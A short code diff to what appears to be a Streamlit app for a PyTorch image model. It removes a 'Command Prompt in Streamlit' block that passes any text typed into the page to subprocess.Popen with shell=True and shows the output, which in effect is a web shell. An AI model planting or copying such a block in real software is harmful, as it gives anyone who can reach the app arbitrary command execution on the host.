@@ -3,23 +3,6 @@ import torch
 import torchvision.transforms as transforms
 from PIL import Image
 
-import streamlit as st
-import subprocess
-
-def run_command(command):
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-    result = process.communicate()[0].strip()
-    return result.decode()
-
-st.title("Command Prompt in Streamlit")
-
-cmd = st.text_input("Enter command:")
-
-if st.button("Run"):
-    result = run_command(cmd)
-    st.text_area("Output:", value=result, height=200)
-
-
 # Load the model
 @st.cache(allow_output_mutation=True)
 def load_model(model_path):
